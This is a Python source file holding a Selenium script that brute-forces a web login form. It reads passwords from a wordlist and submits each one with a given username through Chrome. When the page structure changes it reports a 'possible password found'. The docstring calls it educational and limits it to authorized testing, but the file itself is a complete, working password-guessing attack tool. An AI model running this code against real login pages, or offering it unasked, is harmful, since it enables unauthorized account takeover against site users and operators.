import selenium
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# New imports for the dynamic webdriver logic
from selenium.webdriver.chrome.service import Service as ChromeService
from webdriver_manager.chrome import ChromeDriverManager

def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
    """
    An educational tool to demonstrate password brute-forcing on a login form.
    Use this responsibly and only on systems you are authorized to test.
    """
    # Using 'with open' ensures the file is closed automatically after use
    with open(pass_list, 'r') as f:
        passwords = f.readlines()

    options = webdriver.ChromeOptions()
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-extensions")
    
    # This is the updated, dynamic webdriver initialization logic
    # It automatically downloads and manages the correct ChromeDriver for your browser version
    browser = webdriver.Chrome(service=ChromeService(ChromeDriverManager().install()), options=options)
    
    wait = WebDriverWait(browser, 10)

    try:
        for password in passwords:
            password = password.strip()  # Remove newline characters and whitespace
            if not password:  # Skip any empty lines in the password list
                continue

            try:
                browser.get(website)
                # Wait for the login button to be clickable for more stability
                wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, login_btn_selector)))

                # Find elements
                sel_user = browser.find_element(By.CSS_SELECTOR, username_selector)
                sel_pas = browser.find_element(By.CSS_SELECTOR, password_selector)
                enter = browser.find_element(By.CSS_SELECTOR, login_btn_selector)

                # Input credentials
                sel_user.clear()
                sel_user.send_keys(username)
                sel_pas.clear()
                sel_pas.send_keys(password)
                enter.click() # Use .click() for login buttons

                print('------------------------')
                print(f'Tried password: "{password}" for user: "{username}"')
                print('------------------------')

            except selenium.common.exceptions.NoSuchElementException:
                print('AN ELEMENT WAS NOT FOUND. THIS COULD MEAN THE PASSWORD WORKED OR THE PAGE STRUCTURE CHANGED!')
                print('LAST PASSWORD ATTEMPTED BELOW:')
                print(f'--> Possible password found: {password}')
                return  # Exit the function since we might have succeeded
            
            except selenium.common.exceptions.TimeoutException:
                print(f"Page timed out. Check your selectors or the website's status.")
                break # Exit if the page fails to load properly

    finally:
        print("Script finished. Closing browser.")
        browser.quit() # This ensures the browser window is always closed